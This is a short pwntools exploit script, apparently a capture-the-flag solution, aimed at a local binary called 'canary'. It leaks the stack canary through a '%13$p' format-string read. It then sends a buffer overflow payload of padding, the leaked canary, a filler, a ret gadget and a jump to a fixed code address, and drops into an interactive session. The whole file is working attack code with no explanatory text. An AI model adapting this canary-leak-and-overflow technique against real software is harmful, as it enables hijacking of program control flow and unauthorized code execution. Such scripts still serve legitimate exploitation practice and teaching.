from pwn import*
p= process('./canary')
# p=remote("127.0.0.1", 30818)
p.sendline(b'%13$p')
p.recvuntil(b'chirps:\n')
canary= int(p.recvline().strip().split(b'x')[1][:16],16)
log.success(f'canary:{hex(canary)}')
p1=b'a'*56
p2=b'b'*8
bin=0x0004011FE
ret=0x00040101A
pad=p1+p64(canary)+p2+p64(ret)+p64(bin)
p.send(pad)
p.interactive()